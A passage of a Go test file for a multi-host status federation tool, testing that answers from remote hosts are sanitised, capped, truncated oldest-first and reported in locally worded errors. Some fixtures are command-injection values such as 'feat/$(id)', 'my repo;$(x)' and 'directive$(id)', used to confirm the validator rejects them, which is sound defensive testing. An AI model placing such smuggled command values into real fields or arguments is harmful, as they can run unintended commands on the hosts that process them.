	"age_s", "blocked", "branch", "detail", "finished_window", "from", "host", "live",
	"name", "pr_candidate", "pr_url", "remote_unprobed", "source", "stale", "state", "ts",
}

func TestAdmitHostPoisonEveryLeaf(t *testing.T) {
	fixture := maximalFar(t)
	want, have := map[string]bool{}, map[string]bool{}
	typeLeaves(reflect.TypeFor[FarAnswer](), nil, false, "", want)
	typeLeaves(reflect.TypeFor[FarAnswer](), fixture, true, "", have)
	for _, p := range slices.Sorted(maps.Keys(want)) {
		if !have[p] {
			t.Errorf("the fixture carries no %s: a far string with no poison case", p)
		}
	}

	admit := func(t *testing.T, a map[string]any) map[string]any {
		t.Helper()
		ans, err := AdmitHost(marshal(t, a), "mbp", "halo", ago(1000))
		if err != nil {
			t.Fatal(err)
		}
		return decoded(t, ans)
	}
	// leaves are an admitted answer's non-empty strings and object keys, by
	// path; every one but far text holds to the identifier charset.
	leaves := func(t *testing.T, out map[string]any) map[string]string {
		t.Helper()
		got := map[string]string{}
		var walk func(v any, path string)
		walk = func(v any, path string) {
			switch x := v.(type) {
			case map[string]any:
				for k, e := range x {
					if !farIdentRE.MatchString(k) {
						t.Errorf("key %q at %s", k, path)
					}
					p := strings.TrimPrefix(path+"."+k, ".")
					got[p+"#key"] = k
					walk(e, p)
				}
			case []any:
				for i, e := range x {
					walk(e, strings.TrimPrefix(path+"."+strconv.Itoa(i), "."))
				}
			case string:
				if slices.Contains(farTextPaths, norm(path)) || slices.Contains(farKeyPaths, norm(path)) {
					got[path] = x
					return
				}
				if !farIdentRE.MatchString(x) || strings.Contains(x, "xid") {
					t.Errorf("%s = %q", path, x)
				}
				if x != "" {
					got[path] = x
				}
			}
		}
		walk(out, "")
		return got
	}

	clean := admit(t, fixture)
	kept := leaves(t, clean)
	var ans FarAnswer
	if err := decodeNumbers(marshal(t, clean), &ans); err != nil {
		t.Fatal(err)
	}
	s := ans.Status
	if len(s.Repos) != 1 || len(s.Repos[0].Crews) != 2 || len(s.Skipped) != 1 || s.Machine == nil || len(s.Machine.Leads) != 1 ||
		s.Queue.Head == nil || len(s.Queue.Demoted) != 1 || len(s.Queue.Parked) != 1 || len(ans.Inbox) != 1 || len(ans.Misrouted) != 1 {
		t.Fatalf("a clean answer lost an element: %+v", ans)
	}
	c1 := s.Repos[0].Crews[0]
	if d := c1.Dispatcher; d.PID != nil || d.Pane != nil || d.Lane == nil || len(c1.Holds) != 4 || len(c1.Workers) != 3 || len(c1.OverseerInbox) != 1 {
		t.Errorf("clean c1 = %+v, want pid and pane dropped, the rest kept", c1)
	}
	for _, w := range slices.Concat(c1.Workers, s.Repos[0].Crews[1].Workers) {
		for k := range w {
			if !slices.Contains(projectedWorkerKeys, k) {
				t.Errorf("worker %v kept %s", w["branch"], k)
			}
		}
	}
	for _, e := range ans.Inbox[0].Events {
		if _, ok := e["zz_extra"]; ok {
			t.Errorf("event kept an unknown key: %v", e)
		}
	}

	n := 0
	walkStrings(fixture, "", func(string, string, func(string)) { n++ })
	for i := range n {
		a := decoded(t, fixture)
		var path string
		j := 0
		walkStrings(a, "", func(p, _ string, set func(string)) {
			if j == i {
				path = p
				set(poison)
			}
			j++
		})
		t.Run(path, func(t *testing.T) {
			got := leaves(t, admit(t, a))
			np := norm(strings.TrimSuffix(path, "#key"))
			switch {
			case slices.Contains(farTextPaths, np), kept[path] == "":
			case slices.Contains(farKeyPaths, np):
				if got[path] != poison {
					t.Errorf("%s = %q, want the key kept as it is", path, got[path])
				}
			case slices.Contains(farLabelPaths, np):
				if got[path] != "" || !slices.Contains(slices.Collect(maps.Values(got)), "1 repo(s) with an invalid label shown unlabeled") {
					t.Errorf("a poisoned %s left %q, want it withheld and counted", path, got[path])
				}
			case np == "status.repos[].host":
				if got[path] != "mbp" {
					t.Errorf("repo host = %q, want the settings key", got[path])
				}
			case len(got) >= len(kept):
				t.Errorf("a poisoned %s left %d strings of %d: its element was rewritten, not dropped", path, len(got), len(kept))
			}
		})
	}
}

// A far roster row an overseer's --host probe returns keeps only the fields
// a lane line or the protocol reads, an invalid name dropped.
func TestOverseerProbeRowsProjected(t *testing.T) {
	f := newStatusFix(t,
		fmt.Sprintf(`{"ts":%d,"crew_id":"c1","kind":"dispatch","branch":"r/1","name":"remy","host":"h1","remote":true}`, ago(60)),
		fmt.Sprintf(`{"ts":%d,"crew_id":"c1","kind":"dispatch","branch":"r/2","name":"rex","host":"h1","remote":true}`, ago(60)),
	)
	f.overseer("halo")
	f.opts.OverseerProbe = func(string) roster.Capture {
		return func(_ context.Context, _ string, _ []string, stdout, _ io.Writer) int {
			_, _ = io.WriteString(stdout, `[{"branch":"r/1","name":"re my","state":"working","live":true,"age_s":5,"zz_extra":"x"},`+
				`{"branch":"r/2","from":"worker:r/2#s1-1","name":"rex","state":"working","live":true,"age_s":5,"title":"t;x","zz_extra":"x"}]`)
			return 0
		}
	}
	doc := f.collect(StatusRequest{})
	rows := doc.crew(t, "c1").Workers
	if len(rows) != 2 || rows[0]["branch"] != "r/1" || rows[1]["branch"] != "r/2" {
		t.Fatalf("rows = %v, want r/1 and r/2", rows)
	}
	for _, w := range rows {
		for k := range w {
			if !slices.Contains(projectedWorkerKeys, k) {
				t.Errorf("row kept %s: %v", k, w)
			}
		}
	}
	if _, has := rows[0]["name"]; has {
		t.Errorf("r/1 = %v, want its invalid name dropped", rows[0])
	}
	if w := rows[1]; w["host"] != "h1" || w["from"] != "worker:r/2#s1-1" || w["state"] != "working" || w["remote_unprobed"] != false {
		t.Errorf("row = %v", w)
	}
}

// An overseer probe's stdout is capped as a pull's is: over the cap is a
// failure of that probe alone, never remembered for the host.
func TestOverseerProbeStdoutIsCapped(t *testing.T) {
	m := &probeMemo{timeout: time.Second, failed: map[string]string{}}
	argv := []string{"crew", "roster", "--live", "--", "c1"}
	calls, held := 0, 0
	big := func(_ context.Context, _ string, _ []string, stdout, _ io.Writer) int {
		calls++
		chunk := bytes.Repeat([]byte(" "), 1<<20)
		for range 5 {
			n, _ := stdout.Write(chunk)
			held += n
		}
		return 0
	}
	var stdout, stderr bytes.Buffer
	if rc := m.wrap(big, "c1")(t.Context(), "h1", argv, &stdout, &stderr); rc != 1 || stderr.String() != overSize+"\n" || stdout.Len() != 0 {
		t.Errorf("rc = %d stderr = %q stdout %d bytes, want 1, %q and nothing", rc, stderr.String(), stdout.Len(), overSize)
	}
	if held > farMaxBytes {
		t.Errorf("the probe's stdout held %d bytes, want at most %d", held, farMaxBytes)
	}
	held = 0
	if rc := m.wrap(big, "c1")(t.Context(), "h1", argv, io.Discard, io.Discard); rc != 1 || calls != 2 {
		t.Errorf("rc = %d after %d calls, want the host asked again", rc, calls)
	}
}

// A far crew's worker rows that do not hold are counted in the host's skipped
// notes, never dropped silently.
func TestAdmitHostCountsDroppedWorkerRows(t *testing.T) {
	a := farAnswer()
	crew := a["status"].(map[string]any)["repos"].([]any)[0].(map[string]any)["crews"].([]any)[0].(map[string]any)
	crew["workers"] = append(crew["workers"].([]any),
		map[string]any{"branch": "feat/$(id)", "state": "working"},
		map[string]any{"branch": "feat/y", "from": "worker:x y", "state": "working"},
	)
	ans, err := AdmitHost(marshal(t, a), "mbp", "halo", 0)
	if err != nil {
		t.Fatal(err)
	}
	if w := ans.Status.Repos[0].Crews[0].Workers; len(w) != 1 || w[0]["branch"] != "feat/z" {
		t.Errorf("workers = %v, want feat/z", w)
	}
	if want := (Skipped{Status: "crew c9: 2 worker rows dropped"}); !slices.Equal(ans.Status.Skipped, []Skipped{want}) {
		t.Errorf("skipped = %+v, want %+v", ans.Status.Skipped, want)
	}
}

// A far repo whose label is no identifier keeps its crews, replies and
// misrouted msgs unlabeled; its common dir is a key only, never validated and
// never shown.
func TestAdmitHostKeepsUnlabeledRepos(t *testing.T) {
	a := farAnswer(farEvent(ago(30), "c9", "dispatcher:c9", "overseer:halo", "{}"))
	status := a["status"].(map[string]any)
	repo := status["repos"].([]any)[0].(map[string]any)
	repo["repo"], repo["common"] = "my repo", "/git/my repo;$(x)/"+strings.Repeat("d", 200)+"/.git"
	status["skipped"] = []any{map[string]any{"path": "/git/c++/.git", "status": "no bus"}}
	batch := a["inbox"].([]any)[0].(map[string]any)
	batch["repo"], batch["common"] = "c++", "/git/c++/.git"
	a["misrouted"] = []any{map[string]any{"repo": "c++", "common": "/git/c++/.git", "crew_id": "c9", "from": "worker:a", "ts": ago(40)}}

	ans, err := AdmitHost(marshal(t, a), "mbp", "halo", 0)
	if err != nil {
		t.Fatal(err)
	}
	if r := ans.Status.Repos; len(r) != 1 || r[0].Repo != "" || r[0].Common != "" || r[0].Key != repo["common"] || len(r[0].Crews) != 1 {
		t.Errorf("repos = %+v, want the repo kept unlabeled, its common a key only", r)
	}
	if b := ans.Inbox; len(b) != 1 || b[0].Repo != "" || b[0].Common != "/git/c++/.git" || len(b[0].Events) != 1 {
		t.Errorf("inbox = %+v, want the reply kept unlabeled", b)
	}
	if m := ans.Misrouted; len(m) != 1 || m[0].Repo != "" || m[0].Common != "/git/c++/.git" {
		t.Errorf("misrouted = %+v, want it kept unlabeled", m)
	}
	want := []Skipped{{Status: "no bus"}, {Status: "2 repo(s) with an invalid label shown unlabeled"}}
	if !slices.Equal(ans.Status.Skipped, want) {
		t.Errorf("skipped = %+v, want %+v", ans.Status.Skipped, want)
	}
	raw := marshal(t, ans.Status)
	for _, s := range []string{"my repo", "c++", "/git/"} {
		if bytes.Contains(raw, []byte(s)) {
			t.Errorf("%q is in the status: %s", s, raw)
		}
	}
}

// A far repo whose label is no identifier appears in one answer as a status
// row, as the queue head and as a demoted entry: all three survive the
// overseer's queue projection, shown unlabeled, and the repo is counted once,
// not once per row it appears in.
//
// Built through AdmitHost on a hand-built answer, the way
// TestAdmitHostKeepsUnlabeledRepos and TestAdmitHostRestrictsFarIdentifiers
// are: this finding is in the near-side queue projection AdmitHost owns, while
// the package's far-side producer (ServeFar) would need a whole far fleet with
// holds and budget pressure to emit a queue head at all.
func TestFarQueueEntryUnlabeledRepoSurvives(t *testing.T) {
	const raw = "my repo"
	a := farAnswer()
	status := a["status"].(map[string]any)
	repo := status["repos"].([]any)[0].(map[string]any)
	repo["repo"], repo["common"] = raw, "/git/my repo/.git"
	status["queue"] = map[string]any{
		"head": map[string]any{"repo": raw, "crew_id": "c9", "id": "1700000000000-1", "waited_s": 5},
		"demoted": []any{
			map[string]any{"repo": raw, "crew_id": "c9", "id": "1700000000000-2", "first_due": 1, "demoted_at": 2},
		},
		"parked": []any{},
	}

	ans, err := AdmitHost(marshal(t, a), "mbp", "halo", 0)
	if err != nil {
		t.Fatal(err)
	}
	q := ans.Status.Queue
	if q.Head == nil {
		t.Fatalf("queue head = nil, want the unlabeled head kept, not dropped on the way in: %+v", q)
	}
	if q.Head.Repo != "" || q.Head.CrewID != "c9" || q.Head.ID != "1700000000000-1" {
		t.Errorf("head = %+v, want repo unlabeled with its crew and id kept", q.Head)
	}
	if len(q.Demoted) != 1 || q.Demoted[0].Repo != "" || q.Demoted[0].CrewID != "c9" || q.Demoted[0].ID != "1700000000000-2" {
		t.Errorf("demoted = %+v, want the unlabeled demotion kept", q.Demoted)
	}
	// The row, the head and the demoted entry are the same repo: it is counted
	// once, not once per queue row it appears in.
	want := []Skipped{{Status: "1 repo(s) with an invalid label shown unlabeled"}}
	if !slices.Equal(ans.Status.Skipped, want) {
		t.Errorf("skipped = %+v, want %+v", ans.Status.Skipped, want)
	}
	rawStatus := marshal(t, ans.Status)
	for _, s := range []string{raw, "/git/"} {
		if bytes.Contains(rawStatus, []byte(s)) {
			t.Errorf("%q is in the status: %s", s, rawStatus)
		}
	}
}

// fitFar keeps an answer's oldest rows, inbox events and misrouted msgs
// together, within the row cap and the byte budget, and lowers its ts so the
// lane's floor stays below the first row it left out.
func TestFitFarTruncatesOldestFirst(t *testing.T) {
	base := ago(100)
	ev := func(k int64) map[string]any {
		return map[string]any{"ts": json.Number(strconv.FormatInt(base+k, 10)), "body": strings.Repeat("b", 1000)}
	}
	answer := func() FarAnswer {
		return FarAnswer{V: 1, Self: "mbp", TS: nowMS(), Status: StatusDoc{TS: nowMS()},
			Inbox: []FarBatch{
				{Repo: "a", Common: "/a", Cursor: 9, Events: []map[string]any{ev(10), ev(30), ev(50)}},
				{Repo: "b", Common: "/b", Cursor: 9, Events: []map[string]any{ev(20), ev(60)}},
			},
			Misrouted: []FarMisrouted{{Repo: "a", Common: "/a", CrewID: "c9", From: "worker:x", TS: base + 40}, {Repo: "b", TS: base + 70}},
		}
	}
	all := []int64{10, 20, 30, 40, 50, 60, 70}
	rows := func(a FarAnswer) []int64 {
		var out []int64
		for _, b := range a.Inbox {
			for _, e := range b.Events {
				ts, _ := watch.WholeMS(e["ts"])
				out = append(out, ts-base)
			}
		}
		for _, m := range a.Misrouted {
			out = append(out, m.TS-base)
		}
		slices.Sort(out)
		return out
	}
	settle := FarSettle.Milliseconds()

	a := answer()
	fit(t, &a, 4, farMaxBytes)
	if got := rows(a); !slices.Equal(got, all[:4]) {
		t.Errorf("rows = %v, want the 4 oldest", got)
	}
	if a.TS != base+50-1+settle {
		t.Errorf("ts = %d, want %d: one below the first omitted row, plus the settle", a.TS, base+50-1+settle)
	}

	a = answer()
	fit(t, &a, 500, farMaxBytes)
	if got := rows(a); !slices.Equal(got, all) || a.TS != nowMS() {
		t.Errorf("rows = %v ts = %d, want all 7 and ts unchanged", got, a.TS)
	}

	a = answer()
	a.TS = base + 40
	fit(t, &a, 4, farMaxBytes)
	if a.TS != base+40 {
		t.Errorf("ts = %d, want never above the real ts", a.TS)
	}

	a = answer()
	budget := len(marshal(t, a)) - 2500
	fit(t, &a, 500, budget)
	got := rows(a)
	if n := len(marshal(t, a)); n > budget {
		t.Errorf("the answer is %d bytes, over the budget of %d", n, budget)
	}
	if len(got) == 0 || len(got) >= len(all) || !slices.Equal(got, all[:len(got)]) {
		t.Fatalf("rows = %v, want an oldest-first prefix", got)
	}
	if omitted := all[len(got)]; a.TS != base+omitted-1+settle {
		t.Errorf("ts = %d, want below the first omitted row %d", a.TS, omitted)
	}
}

func fit(t *testing.T, a *FarAnswer, maxRows, maxBytes int) {
	t.Helper()
	if err := fitFar(a, maxRows, maxBytes); err != nil {
		t.Fatal(err)
	}
}

// fitFar's cut backs off to the start of the ts group it falls in, so no
// group straddles it; when that leaves nothing to serve, the answer cannot
// advance and is refused instead of served again unchanged.
func TestFitFarCutsBetweenTsGroups(t *testing.T) {
	base := ago(100)
	answer := func(ts ...int64) FarAnswer {
		var evs []map[string]any
		for _, k := range ts {
			evs = append(evs, map[string]any{"ts": json.Number(strconv.FormatInt(base+k, 10)), "body": "b"})
		}
		return FarAnswer{V: 1, Self: "mbp", TS: nowMS(), Status: StatusDoc{TS: nowMS()},
			Inbox: []FarBatch{{Repo: "a", Common: "/a", Events: evs}}, Misrouted: []FarMisrouted{{Repo: "a", TS: base + 20}}}
	}

	a := answer(10, 10, 10, 20, 20, 30)
	fit(t, &a, 4, farMaxBytes)
	if n := len(a.Inbox[0].Events); n != 3 || len(a.Misrouted) != 0 || a.TS != base+20-1+FarSettle.Milliseconds() {
		t.Errorf("kept %d events %d misrouted, ts %d: want the ts-10 group alone, ts below the ts-20 group", n, len(a.Misrouted), a.TS)
	}

	a = answer(10, 10, 10, 10, 10, 30)
	if err := fitFar(&a, 4, farMaxBytes); err == nil || err.Error() != fmt.Sprintf("answer cannot advance: 5 rows share ts %d, over the caps", base+10) {
		t.Errorf("err = %v, want the ts-10 group refused", err)
	}

	a = answer(10, 30)
	skeleton := a
	skeleton.Inbox, skeleton.Misrouted = []FarBatch{}, []FarMisrouted{}
	if err := fitFar(&a, 4, len(marshal(t, skeleton))+20); err == nil || err.Error() != "answer cannot advance: its oldest row is over the byte budget" {
		t.Errorf("err = %v, want the oversize oldest row refused", err)
	}
}

// A far failure is worded here: the far stderr never reaches a host's error
// or a probe's host_error.
func TestFederateFailureIsLocallyWorded(t *testing.T) {
	poisoned := func(rc int) roster.Capture {
		return func(_ context.Context, _ string, _ []string, _, stderr io.Writer) int {
			_, _ = io.WriteString(stderr, "far: \x1b[31m$(id) refused\nmore\n")
			return rc
		}
	}
	for _, tc := range []struct {
		rc   int
		want string
	}{{1, "exit status 1"}, {255, "ssh failed (255)"}} {
		f := newStatusFix(t)
		f.overseer("halo", "mbp")
		f.opts.Federate = poisoned(tc.rc)
		if h := f.collect(StatusRequest{}).Hosts[0]; h.Error == nil || *h.Error != tc.want {
			t.Errorf("rc %d: error = %v, want %q", tc.rc, deref(h.Error), tc.want)
		}
	}
	f := newStatusFix(t)
	f.overseer("halo", "mbp")
	f.opts.Federate = answering("x;$(id) {")
	if h := f.collect(StatusRequest{}).Hosts[0]; h.Error == nil || *h.Error != "answer is not JSON" {
		t.Errorf("error = %v, want the refusal with no far text", deref(h.Error))
	}

	p := newStatusFix(t, fmt.Sprintf(`{"ts":%d,"crew_id":"c1","kind":"dispatch","branch":"r/1","name":"remy","host":"h1","remote":true}`, ago(60)))
	p.overseer("halo")
	p.opts.OverseerProbe = func(string) roster.Capture { return poisoned(1) }
	if w := p.collect(StatusRequest{}).crew(t, "c1").Workers[0]; w["host_error"] != "exit status 1" {
		t.Errorf("row = %v, want host_error exit status 1", w)
	}
}

// The far status's refusal codes, and this host's sentence for each: Step 17
// promotes the codes and the sentence map into production.
const (
	codeOverBudget     = "over_budget"
	codeTSGroupOverCap = "ts_group_over_cap"
	// unknownRefusalCode is no code this host knows, and no far text in it may
	// reach a sentence.
	unknownRefusalCode = "directive$(id)"
	// refuseUnknownSentence is the default, mirroring overseer/msg.go's
	// `refused (unknown reason)`: never empty, since finish would read an empty
	// reason as an ok answer.
	refuseUnknownSentence = "refused (unknown reason)"
)

var refusalSentences = map[string]string{
	codeOverBudget:     "refused: the far answer cannot advance: its oldest row is over the byte budget",
	codeTSGroupOverCap: "refused: the far answer cannot advance: too many rows share one ts",
}

// A far refusal is this host's sentence for the code on the answer, never the
// exit status and never any far text. The sentence is the same whether the far
// exited non-zero or answered rc 0 with a code, and a code this host does not
// know gets the default sentence, never an empty one.
func TestFarRefusalSentence(t *testing.T) {
	refusal := func(code string) string {
		return fmt.Sprintf(`{"v":1,"self":"mbp","ts":%d,"refuse":%q}`, nowMS(), code)
	}
	for _, tc := range []struct {
		name, code string
		rc         int
		want       string
	}{
		{"over budget, on a non-zero exit", codeOverBudget, 1, refusalSentences[codeOverBudget]},
		{"over budget, on rc 0", codeOverBudget, 0, refusalSentences[codeOverBudget]},
		{"ts group over cap, on a non-zero exit", codeTSGroupOverCap, 1, refusalSentences[codeTSGroupOverCap]},
		{"ts group over cap, on rc 0", codeTSGroupOverCap, 0, refusalSentences[codeTSGroupOverCap]},
		{"an unknown code, on a non-zero exit", unknownRefusalCode, 1, refuseUnknownSentence},
		{"an unknown code, on rc 0", unknownRefusalCode, 0, refuseUnknownSentence},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newStatusFix(t)
			f.overseer("halo", "mbp")
			text := refusal(tc.code)
			f.opts.Federate = func(_ context.Context, _ string, _ []string, stdout, _ io.Writer) int {
				_, _ = io.WriteString(stdout, text)
				return tc.rc
			}
			h := f.collect(StatusRequest{}).Hosts[0]
			if h.State != "unreachable" {
				t.Errorf("state = %q, want unreachable", h.State)
			}
			if h.Error == nil {
				t.Fatalf("error = nil, want %q", tc.want)
			}
			if *h.Error != tc.want {
				t.Errorf("error = %q, want %q", *h.Error, tc.want)
			}
			if strings.Contains(*h.Error, "exit status") || strings.Contains(*h.Error, tc.code) {
				t.Errorf("error = %q, want no exit status and no far text", *h.Error)
			}
			if h.TS != nil || len(h.Repos) != 0 || h.Machine != nil || h.Batches() != nil {
				t.Errorf("a refused host carries no far data: %+v", h)
			}
		})
	}
}

func deref(s *string) string {
	if s == nil {
		return "<nil>"
	}
	return *s
}

// A probe answer keeps one row per branch, the first; past the worker cap the
// probe fails and the host's workers read as placeholders.
func TestOverseerProbeRowsOnePerBranchCapped(t *testing.T) {
	answer := func(rows []string) *statusFix {
		f := newStatusFix(t, fmt.Sprintf(`{"ts":%d,"crew_id":"c1","kind":"dispatch","branch":"r/1","name":"remy","host":"h1","remote":true}`, ago(60)))
		f.overseer("halo")
		f.opts.OverseerProbe = func(string) roster.Capture {
			return func(_ context.Context, _ string, _ []string, stdout, _ io.Writer) int {
				_, _ = io.WriteString(stdout, "["+strings.Join(rows, ",")+"]")
				return 0
			}
		}
		return f
	}
	dup := slices.Repeat([]string{`{"branch":"r/1","state":"blocked","live":true}`}, 5000)
	dup[0] = `{"branch":"r/1","state":"working","live":true}`
	rows := answer(dup).collect(StatusRequest{}).crew(t, "c1").Workers
	if len(rows) != 1 || rows[0]["state"] != "working" {
		t.Errorf("%d rows, first %v; want the first r/1 row alone", len(rows), rows[0])
	}

	var many []string
	for i := range farMaxWorkers + 1 {
		many = append(many, fmt.Sprintf(`{"branch":"r/%d","state":"working","live":true}`, i+1))
	}
	rows = answer(many).collect(StatusRequest{}).crew(t, "c1").Workers
	if len(rows) != 1 || rows[0]["host_error"] != "answer: 201 roster rows, over the cap of 200 rows" {
		t.Errorf("rows = %v, want the r/1 placeholder with the cap reason", rows)
	}
}

// A probe row that does not hold fails the probe: the host's workers read as
// placeholders with a reason worded here, never vanish.
func TestOverseerProbeDroppedRowFailsTheProbe(t *testing.T) {
	f := newStatusFix(t,
		fmt.Sprintf(`{"ts":%d,"crew_id":"c1","kind":"dispatch","branch":"r/1","name":"remy","host":"h1","remote":true}`, ago(60)),
		fmt.Sprintf(`{"ts":%d,"crew_id":"c1","kind":"dispatch","branch":"r/2","name":"rex","host":"h1","remote":true}`, ago(60)),
	)
	f.overseer("halo")
	f.opts.OverseerProbe = func(string) roster.Capture {
		return func(_ context.Context, _ string, _ []string, stdout, _ io.Writer) int {
			_, _ = io.WriteString(stdout, `[{"branch":"r/1","from":"worker:$(id)","state":"working"},{"branch":"r/2","state":"working"},7]`)
			return 0
		}
	}
	rows := f.collect(StatusRequest{}).crew(t, "c1").Workers
	if len(rows) != 2 {
		t.Fatalf("rows = %v, want both placeholders", rows)
	}
	for _, w := range rows {
		if w["host_error"] != "answer: 2 roster rows dropped" || w["state"] != nil {
			t.Errorf("row = %v, want a placeholder naming the dropped rows", w)
		}
	}
}
